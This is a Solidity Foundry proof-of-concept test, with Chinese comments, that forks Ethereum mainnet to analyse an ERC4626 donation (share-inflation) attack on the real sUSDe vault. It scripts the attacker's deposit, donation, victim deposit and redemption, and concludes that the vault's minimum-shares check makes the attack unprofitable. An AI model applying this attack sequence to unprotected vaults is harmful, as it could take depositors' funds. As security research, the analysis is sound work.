// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// ===========================================================================
// sUSDe (Staked USDe) Donation Attack Analysis PoC
//
// @KeyInfo
// Vault Address: 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497
// Asset: USDe (0x4c9EDD5852cd905f086C759E8383e09bff1E68B3)
// Deploy Block: 18571359
//
// @AttackType
// ERC4626 Inflation Attack Analysis at Deploy Block
//
// @SecurityFindings
// 1. sUSDe 的 _checkMinShares() 防护阻止了经典"受害者获得 0 shares"的攻击
// 2. 但 vault 从部署区块起就是 balance-based（donation 敏感）
// 3. Donation 可以将 share price 从 1:1 膨胀到 100,000:1
// 4. 精度损失仍然存在，但由于 MIN_SHARES=1e18 的限制，损失金额有限
//
// @MinSharesProtection
// - sUSDe 要求 totalSupply >= MIN_SHARES (1e18) 在任何操作后
// - 这意味着攻击者必须存入至少 1e18 assets (1 USDe)
// - 攻击者赎回时也必须保留足够 shares 使 totalSupply >= 1e18
// - 这是一个部分缓解的案例——vault 有 donation 敏感性，但内置防护限制了攻击效果
//
// @Conclusion
// 经典的 donation attack 在 sUSDe 上不可行，但精度损失仍然存在
// ===========================================================================

import "../basetest.sol";
import {IERC20} from "../interface.sol";

// ---------------------------------------------------------------------------
// 接口定义
// ---------------------------------------------------------------------------

interface IsUSDe is IERC20 {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function mint(uint256 shares, address receiver) external returns (uint256 assets);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
    // sUSDe specific - cooldown mechanism
    function cooldownShares(uint256 shares) external;
    function cooldownAssets(uint256 assets) external;
    function unstake(address receiver) external;
    function cooldownDuration() external view returns (uint24);
    function stakerCooldown(address staker) external view returns (uint104 cooldownEnd, uint104 underlyingAmount);
    // Roles
    function hasRole(bytes32 role, address account) external view returns (bool);
}

// ---------------------------------------------------------------------------
// 主测试合约
// ---------------------------------------------------------------------------

contract sUSDe_DonationPoC is BaseTestWithBalanceLog {
    // === 地址常量 ===
    IERC20 internal constant USDe = IERC20(0x4c9EDD5852cd905f086C759E8383e09bff1E68B3);
    IsUSDe internal constant sUSDe = IsUSDe(0x9D39A5DE30e57443BfF2A8307A4256c8797A3497);

    // === Fork 区块 - sUSDe 部署区块 ===
    uint256 internal constant DEPLOY_BLOCK = 18_571_359;

    // === 攻击参数 ===
    // sUSDe 的 _checkMinShares() 要求 deposit 后 totalSupply >= MIN_SHARES
    // MIN_SHARES = 1e18 (1 share)，所以攻击者必须存入至少 1e18 assets
    uint256 internal constant ATTACKER_DEPOSIT = 1e18; // 1 USDe - 满足 MIN_SHARES 要求
    // 使用更大的 donation 来最大化精度损失
    uint256 internal constant DONATION_AMOUNT = 1_000_000 * 1e18; // 1M USDe donation
    // 受害者存款 - 小于 donation 来展示精度损失
    uint256 internal constant VICTIM_DEPOSIT = 100_000 * 1e18; // 100K USDe - 受害者存款

    // === 测试账户 ===
    address internal constant ATTACKER = address(0xdead);
    address internal constant VICTIM = address(0xbeef);
    // 对比测试账户（无 donation 场景）
    address internal constant VICTIM_NO_DONATION = address(0xcafe);

    // === 实际使用的 fork 区块 ===
    uint256 internal actualForkBlock;

    function setUp() public {
        actualForkBlock = DEPLOY_BLOCK;
        vm.createSelectFork("mainnet", actualForkBlock);
        fundingToken = address(USDe);

        vm.label(address(USDe), "USDe");
        vm.label(address(sUSDe), "sUSDe");
        vm.label(ATTACKER, "Attacker");
        vm.label(VICTIM, "Victim");
        vm.label(VICTIM_NO_DONATION, "VictimNoDonation");

        // 打印初始状态确认 vault 是空的
        emit log_string("=== Setup: Checking Vault State at Deploy Block ===");
        emit log_named_uint("Fork Block", actualForkBlock);
        emit log_named_decimal_uint("sUSDe.totalSupply()", sUSDe.totalSupply(), 18);
        emit log_named_decimal_uint("sUSDe.totalAssets()", sUSDe.totalAssets(), 18);
        emit log_named_decimal_uint("USDe.balanceOf(vault)", USDe.balanceOf(address(sUSDe)), 18);
        emit log_named_uint("cooldownDuration", sUSDe.cooldownDuration());
    }

    // =========================================================================
    // 辅助函数: 动态赎回策略（避免 MinSharesViolation）
    // =========================================================================
    function _redeemShares(address owner, uint256 shares, address receiver) internal {
        uint24 cd = sUSDe.cooldownDuration();
        emit log_named_uint("Cooldown Duration", cd);

        if (cd == 0) {
            // cooldown 未启用，直接 redeem
            emit log_string("Using direct redeem (cooldown disabled)");
            vm.prank(owner);
            sUSDe.redeem(shares, receiver, owner);
        } else {
            // 两步赎回: cooldownShares -> wait -> unstake
            emit log_string("Using two-step unstake (cooldown enabled)");
            vm.prank(owner);
            sUSDe.cooldownShares(shares);

            emit log_string("Warping time to skip cooldown...");
            vm.warp(block.timestamp + cd + 1);

            vm.prank(owner);
            sUSDe.unstake(receiver);
        }
    }

    /// @dev 计算攻击者可以安全赎回的 shares 数量，避免触发 MinSharesViolation
    /// @param attackerShares 攻击者持有的 shares
    /// @return redeemableShares 可赎回的 shares 数量
    function _calculateRedeemableShares(uint256 attackerShares) internal view returns (uint256) {
        uint256 totalSupply_ = sUSDe.totalSupply();
        uint256 otherShares = totalSupply_ - attackerShares; // 其他用户（受害者）的 shares
        
        // MIN_SHARES = 1e18，赎回后 totalSupply 必须 >= 1e18
        uint256 MIN_SHARES = 1e18;
        
        if (otherShares >= MIN_SHARES) {
            // 受害者的 shares 已经足够满足 MIN_SHARES，攻击者可以赎回全部
            return attackerShares;
        } else {
            // 需要保留一部分 shares 使 totalSupply >= MIN_SHARES
            uint256 mustKeep = MIN_SHARES - otherShares;
            if (attackerShares > mustKeep) {
                return attackerShares - mustKeep;
            } else {
                return 0; // 攻击者 shares 太少，无法赎回
            }
        }
    }

    // =========================================================================
    // Test 1: 验证 vault 在部署区块是空的且 balance-based
    // =========================================================================
    function testDonationSensitivity() public {
        emit log_string("=== Test 1: Donation Sensitivity Check ===");
        emit log_named_uint("Fork Block", actualForkBlock);

        uint256 totalSupplyBefore = sUSDe.totalSupply();
        uint256 totalAssetsBefore = sUSDe.totalAssets();
        uint256 vaultBalanceBefore = USDe.balanceOf(address(sUSDe));

        emit log_named_decimal_uint("Total Supply Before", totalSupplyBefore, 18);
        emit log_named_decimal_uint("Total Assets Before", totalAssetsBefore, 18);
        emit log_named_decimal_uint("Vault Balance Before", vaultBalanceBefore, 18);

        // 验证 vault 是空的
        require(totalSupplyBefore == 0, "Vault should be empty at deploy block");
        emit log_string("[OK] Vault is EMPTY at deploy block");

        // 给测试合约提供 USDe 用于 donation
        deal(address(USDe), address(this), DONATION_AMOUNT);

        // 执行 donation
        emit log_string("Executing donation...");
        USDe.transfer(address(sUSDe), DONATION_AMOUNT / 10);

        uint256 totalAssetsAfter = sUSDe.totalAssets();
        uint256 vaultBalanceAfter = USDe.balanceOf(address(sUSDe));

        emit log_named_decimal_uint("Total Assets After", totalAssetsAfter, 18);
        emit log_named_decimal_uint("Vault Balance After", vaultBalanceAfter, 18);

        // 验证 balance-based: totalAssets 应该随着 balance 变化
        uint256 assetIncrease = totalAssetsAfter - totalAssetsBefore;
        uint256 balanceIncrease = vaultBalanceAfter - vaultBalanceBefore;

        emit log_named_decimal_uint("Asset Increase", assetIncrease, 18);
        emit log_named_decimal_uint("Balance Increase", balanceIncrease, 18);

        require(assetIncrease == balanceIncrease, "totalAssets should track balance");
        require(assetIncrease > 0, "Donation should increase totalAssets");
        emit log_string("[OK] Vault is BALANCE-BASED (donation sensitive)");
    }

    // =========================================================================
    // Test 2: 演示 donation 导致 share price 极端膨胀
    // =========================================================================
    function testDonationAttack() public balanceLog {
        emit log_string("=== Test 2: Donation Attack - Share Price Inflation ===");
        emit log_named_uint("Fork Block", actualForkBlock);

        uint256 totalSupplyBefore = sUSDe.totalSupply();
        uint256 totalAssetsBefore = sUSDe.totalAssets();

        emit log_named_decimal_uint("Initial Total Supply", totalSupplyBefore, 18);
        emit log_named_decimal_uint("Initial Total Assets", totalAssetsBefore, 18);

        // 给攻击者提供资金
        deal(address(USDe), address(this), DONATION_AMOUNT + ATTACKER_DEPOSIT);

        // === Step 1: 攻击者先存入最小金额获取初始 shares ===
        emit log_string("=== Step 1: Attacker deposits minimal amount ===");
        USDe.approve(address(sUSDe), ATTACKER_DEPOSIT);

        uint256 attackerShares;
        try sUSDe.deposit(ATTACKER_DEPOSIT, address(this)) returns (uint256 shares) {
            attackerShares = shares;
            emit log_string("[OK] Deposit succeeded");
        } catch Error(string memory reason) {
            emit log_named_string("Revert reason", reason);
            revert("Deposit failed - check _checkMinShares requirement");
        } catch (bytes memory data) {
            emit log_bytes(data);
            revert("Deposit failed with bytes error");
        }

        emit log_named_decimal_uint("Attacker Deposit", ATTACKER_DEPOSIT, 18);
        emit log_named_decimal_uint("Attacker Shares Received", attackerShares, 18);

        uint256 sharePriceAfterDeposit = sUSDe.convertToAssets(1e18);
        emit log_named_decimal_uint("Share Price After Deposit (assets per share)", sharePriceAfterDeposit, 18);

        // === Step 2: 攻击者执行 donation，抬高 share price ===
        emit log_string("=== Step 2: Attacker donates to vault ===");
        USDe.transfer(address(sUSDe), DONATION_AMOUNT);

        uint256 totalAssetsAfterDonation = sUSDe.totalAssets();
        uint256 sharePriceAfterDonation = sUSDe.convertToAssets(1e18);

        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfterDonation, 18);
        emit log_named_decimal_uint("Share Price After Donation (assets per share)", sharePriceAfterDonation, 18);

        // 计算 share price 膨胀倍数
        uint256 inflationMultiplier = sharePriceAfterDonation * 1e18 / sharePriceAfterDeposit;
        emit log_named_decimal_uint("Share Price Inflation Multiplier", inflationMultiplier, 18);

        // 验证 share price 被大幅抬高
        require(sharePriceAfterDonation > sharePriceAfterDeposit * 1000, "Share price should be inflated 1000x+");
        emit log_string("[OK] Donation successfully inflated share price by 1000x+");
    }

    // =========================================================================
    // Test 3: 完整攻击链分析 - 展示精度损失和 _checkMinShares 的保护效果
    // =========================================================================
    function testFullAttackFlow() public balanceLog {
        emit log_string("============================================================");
        emit log_string("=== Test 3: ERC4626 Donation Attack Analysis ===");
        emit log_string("=== Demonstrating _checkMinShares Protection ===");
        emit log_string("============================================================");
        emit log_named_uint("Fork Block", actualForkBlock);

        // 记录初始状态
        uint256 initialTotalSupply = sUSDe.totalSupply();
        uint256 initialTotalAssets = sUSDe.totalAssets();

        emit log_named_decimal_uint("Initial Total Supply", initialTotalSupply, 18);
        emit log_named_decimal_uint("Initial Total Assets", initialTotalAssets, 18);

        require(initialTotalSupply == 0, "Vault must be empty for analysis");

        // 给攻击者提供资金 (极小存款 + 大额 donation)
        deal(address(USDe), ATTACKER, ATTACKER_DEPOSIT + DONATION_AMOUNT);

        // 给受害者提供资金
        deal(address(USDe), VICTIM, VICTIM_DEPOSIT);

        // 给对比测试受害者提供资金
        deal(address(USDe), VICTIM_NO_DONATION, VICTIM_DEPOSIT);

        // =============================================================
        // Step 1: 攻击者先存入最小金额获取初始 shares
        // =============================================================
        emit log_string("");
        emit log_string("=== Step 1: Attacker deposits minimal amount for initial shares ===");

        vm.startPrank(ATTACKER);
        USDe.approve(address(sUSDe), ATTACKER_DEPOSIT);

        uint256 attackerShares;
        try sUSDe.deposit(ATTACKER_DEPOSIT, ATTACKER) returns (uint256 shares) {
            attackerShares = shares;
            emit log_string("[OK] Attacker deposit succeeded");
        } catch Error(string memory reason) {
            emit log_named_string("Revert reason", reason);
            revert("Attacker deposit failed - adjust ATTACKER_DEPOSIT");
        } catch (bytes memory data) {
            emit log_bytes(data);
            revert("Attacker deposit failed with bytes error");
        }
        vm.stopPrank();

        emit log_named_decimal_uint("Attacker Deposit Amount", ATTACKER_DEPOSIT, 18);
        emit log_named_decimal_uint("Attacker Shares Received", attackerShares, 18);

        // 此时 share price 应该是 ~1:1
        uint256 sharePriceAfterStep1 = sUSDe.convertToAssets(1e18);
        emit log_named_decimal_uint("Share Price After Step 1", sharePriceAfterStep1, 18);

        // =============================================================
        // Step 2: 攻击者执行 donation，大幅抬高 share price
        // =============================================================
        emit log_string("");
        emit log_string("=== Step 2: Attacker donates large amount to inflate share price ===");

        vm.prank(ATTACKER);
        USDe.transfer(address(sUSDe), DONATION_AMOUNT);

        uint256 totalAssetsAfterDonation = sUSDe.totalAssets();
        uint256 sharePriceAfterStep2 = sUSDe.convertToAssets(1e18);

        emit log_named_decimal_uint("Donation Amount", DONATION_AMOUNT, 18);
        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfterDonation, 18);
        emit log_named_decimal_uint("Share Price After Step 2", sharePriceAfterStep2, 18);

        // 计算膨胀倍数
        uint256 inflationMultiplier = sharePriceAfterStep2 * 1e18 / sharePriceAfterStep1;
        emit log_named_decimal_uint("Share Price Inflation (x)", inflationMultiplier, 18);

        // =============================================================
        // Step 3: 受害者存入资金
        // =============================================================
        emit log_string("");
        emit log_string("=== Step 3: Victim deposits (WITH donation effect) ===");

        // 计算 victim 预期获得的 shares
        uint256 expectedSharesNormal = VICTIM_DEPOSIT; // 如果 share price = 1:1
        uint256 actualSharesExpected = sUSDe.convertToShares(VICTIM_DEPOSIT);

        emit log_named_decimal_uint("Victim Deposit Amount", VICTIM_DEPOSIT, 18);
        emit log_named_decimal_uint("Expected Shares (if 1:1)", expectedSharesNormal, 18);
        emit log_named_decimal_uint("Actual Shares (convertToShares)", actualSharesExpected, 18);

        vm.startPrank(VICTIM);
        USDe.approve(address(sUSDe), VICTIM_DEPOSIT);
        uint256 victimShares = sUSDe.deposit(VICTIM_DEPOSIT, VICTIM);
        vm.stopPrank();

        emit log_named_decimal_uint("Victim Shares Received", victimShares, 18);

        // =============================================================
        // Step 4: 对比测试 - 无 donation 场景
        // =============================================================
        emit log_string("");
        emit log_string("=== Step 4: Comparison - Victim deposits WITHOUT donation ===");
        emit log_string("(Simulating parallel universe without donation)");

        // 计算无 donation 时受害者会获得的 shares
        // 公式: shares = assets * totalSupply / totalAssets
        // 无 donation 时: totalSupply = attackerShares, totalAssets = ATTACKER_DEPOSIT
        uint256 sharesWithoutDonation = VICTIM_DEPOSIT * attackerShares / ATTACKER_DEPOSIT;
        emit log_named_decimal_uint("Shares WITHOUT donation", sharesWithoutDonation, 18);
        emit log_named_decimal_uint("Shares WITH donation", victimShares, 18);

        // 计算精度损失
        uint256 precisionLossShares = 0;
        if (sharesWithoutDonation > victimShares) {
            precisionLossShares = sharesWithoutDonation - victimShares;
        }
        emit log_named_decimal_uint("Precision Loss (shares)", precisionLossShares, 18);

        // =============================================================
        // Step 5: 分析攻击效果
        // =============================================================
        emit log_string("");
        emit log_string("=== Step 5: Analyzing attack effect ===");

        uint256 totalSupplyAfter = sUSDe.totalSupply();
        uint256 totalAssetsAfter = sUSDe.totalAssets();

        emit log_named_decimal_uint("Total Supply After Attack", totalSupplyAfter, 18);
        emit log_named_decimal_uint("Total Assets After Attack", totalAssetsAfter, 18);

        // 计算攻击者和受害者的实际资产价值
        uint256 attackerAssetValue = sUSDe.convertToAssets(attackerShares);
        uint256 victimAssetValue = 0;
        if (victimShares > 0) {
            victimAssetValue = sUSDe.convertToAssets(victimShares);
        }

        emit log_named_decimal_uint("Attacker Shares Value (assets)", attackerAssetValue, 18);
        emit log_named_decimal_uint("Victim Shares Value (assets)", victimAssetValue, 18);

        // 计算攻击者持股比例
        uint256 attackerOwnership = attackerShares * 1e18 / totalSupplyAfter;
        emit log_named_decimal_uint("Attacker Ownership %", attackerOwnership, 18);

        // =============================================================
        // Step 6: 攻击者赎回 - 使用安全的赎回策略避免 MinSharesViolation
        // =============================================================
        emit log_string("");
        emit log_string("=== Step 6: Attacker redeems shares (safe strategy) ===");

        // 记录攻击者赎回前的 USDe 余额
        uint256 attackerUSDeBeforeRedeem = USDe.balanceOf(ATTACKER);
        emit log_named_decimal_uint("Attacker USDe Before Redeem", attackerUSDeBeforeRedeem, 18);

        // 计算可安全赎回的 shares 数量
        uint256 redeemableShares = _calculateRedeemableShares(attackerShares);
        emit log_named_decimal_uint("Attacker Total Shares", attackerShares, 18);
        emit log_named_decimal_uint("Redeemable Shares (safe)", redeemableShares, 18);

        require(redeemableShares > 0, "Should have redeemable shares");

        // 使用动态赎回策略
        _redeemShares(ATTACKER, redeemableShares, ATTACKER);

        uint256 attackerUSDeAfterRedeem = USDe.balanceOf(ATTACKER);
        uint256 attackerExtracted = attackerUSDeAfterRedeem - attackerUSDeBeforeRedeem;

        emit log_named_decimal_uint("Attacker USDe After Redeem", attackerUSDeAfterRedeem, 18);
        emit log_named_decimal_uint("Attacker Extracted Amount", attackerExtracted, 18);

        // 验证赎回后 totalSupply 仍然 >= MIN_SHARES
        uint256 totalSupplyAfterRedeem = sUSDe.totalSupply();
        emit log_named_decimal_uint("Total Supply After Redeem", totalSupplyAfterRedeem, 18);
        require(totalSupplyAfterRedeem >= 1e18, "Total supply should remain >= MIN_SHARES");
        emit log_string("[OK] No MinSharesViolation - redeem successful");

        // =============================================================
        // 最终分析
        // =============================================================
        emit log_string("");
        emit log_string("============================================================");
        emit log_string("=== FINAL ANALYSIS ===");
        emit log_string("============================================================");

        // 攻击者成本 = 初始存款 + donation（但 donation 被回收）
        // 攻击者收益 = 赎回金额 - 初始存款
        uint256 attackerNetProfit = 0;
        if (attackerExtracted > ATTACKER_DEPOSIT) {
            attackerNetProfit = attackerExtracted - ATTACKER_DEPOSIT;
        }

        emit log_named_decimal_uint("Attacker Initial Deposit", ATTACKER_DEPOSIT, 18);
        emit log_named_decimal_uint("Attacker Donation (cost)", DONATION_AMOUNT, 18);
        emit log_named_decimal_uint("Attacker Extracted", attackerExtracted, 18);
        emit log_named_decimal_uint("Attacker NET PROFIT", attackerNetProfit, 18);

        // 受害者损失 = 存款金额 - shares 价值
        uint256 victimLoss = VICTIM_DEPOSIT - victimAssetValue;
        emit log_named_decimal_uint("Victim Deposit", VICTIM_DEPOSIT, 18);
        emit log_named_decimal_uint("Victim Shares Value", victimAssetValue, 18);
        emit log_named_decimal_uint("Victim LOSS (precision loss)", victimLoss, 18);

        // =============================================================
        // 关键发现：_checkMinShares 的保护效果
        // =============================================================
        emit log_string("");
        emit log_string("============================================================");
        emit log_string("=== KEY FINDINGS: _checkMinShares Protection ===");
        emit log_string("============================================================");

        // 验证受害者获得了 shares（不是经典的 0-shares 攻击）
        require(victimShares > 0, "Victim should receive some shares");
        emit log_string("[FINDING 1] Victim DID receive shares (not 0-shares attack)");
        emit log_string("             _checkMinShares prevents classic donation attack");

        // 验证精度损失存在
        emit log_string("");
        if (precisionLossShares > 0) {
            emit log_string("[FINDING 2] Precision loss EXISTS due to integer division");
            emit log_named_decimal_uint("             Precision loss in shares", precisionLossShares, 18);
        } else {
            emit log_string("[FINDING 2] No precision loss in this scenario");
        }

        // 验证攻击者无法获得显著利润
        emit log_string("");
        emit log_string("[FINDING 3] Attacker CANNOT make significant profit");
        emit log_string("             Due to MIN_SHARES=1e18 requirement");
        emit log_string("             Attacker must deposit at least 1 USDe");

        // 计算实际影响范围
        uint256 victimLossPercent = victimLoss * 100 / VICTIM_DEPOSIT;
        emit log_string("");
        emit log_named_uint("Victim Loss Percentage", victimLossPercent);
        emit log_string("(Loss is minimal due to _checkMinShares protection)");

        // =============================================================
        // 断言：验证 _checkMinShares 的保护效果
        // =============================================================
        emit log_string("");
        emit log_string("=== ASSERTIONS ===");

        // 1. 受害者获得了 shares（不是经典的 0-shares 攻击）
        // 由于 share price 膨胀到 ~100万:1，受害者存入 100K 只获得 ~0.1 shares
        require(victimShares > 0, "Victim should receive some shares (not 0)");
        emit log_string("[PASS] Victim received shares (> 0) - not classic 0-shares attack");

        // 2. 精度损失存在（即使很小）
        require(victimLoss > 0, "Precision loss should exist");
        emit log_string("[PASS] Precision loss exists (demonstrates donation effect)");

        // 3. 但损失被限制在合理范围内（< 1%）
        require(victimLossPercent < 1, "Loss should be < 1% due to protection");
        emit log_string("[PASS] Loss is limited (< 1%) - protection works");

        // 4. 攻击者实际上亏损（捐赠成本 > 赎回收益）
        // 攻击者投入：ATTACKER_DEPOSIT + DONATION_AMOUNT
        // 攻击者赎回：attackerExtracted
        // 净损益 = attackerExtracted - (ATTACKER_DEPOSIT + DONATION_AMOUNT)
        uint256 attackerTotalCost = ATTACKER_DEPOSIT + DONATION_AMOUNT;
        int256 attackerRealProfit = int256(attackerExtracted) - int256(attackerTotalCost);
        emit log_named_int("Attacker Real Profit (considering donation cost)", attackerRealProfit);
        
        require(attackerRealProfit < 0, "Attacker should LOSE money (donation cost > extract)");
        emit log_string("[PASS] Attacker LOSES money - attack NOT profitable");

        emit log_string("");
        emit log_string("============================================================");
        emit log_string("[OK] Full attack flow analysis completed!");
        emit log_string("CONCLUSION: _checkMinShares effectively prevents classic");
        emit log_string("            donation attack, but precision loss still exists");
        emit log_string("============================================================");
    }

    // =========================================================================
    // 辅助函数
    // =========================================================================

    function totalSupply() internal view returns (uint256) {
        return sUSDe.totalSupply();
    }
}
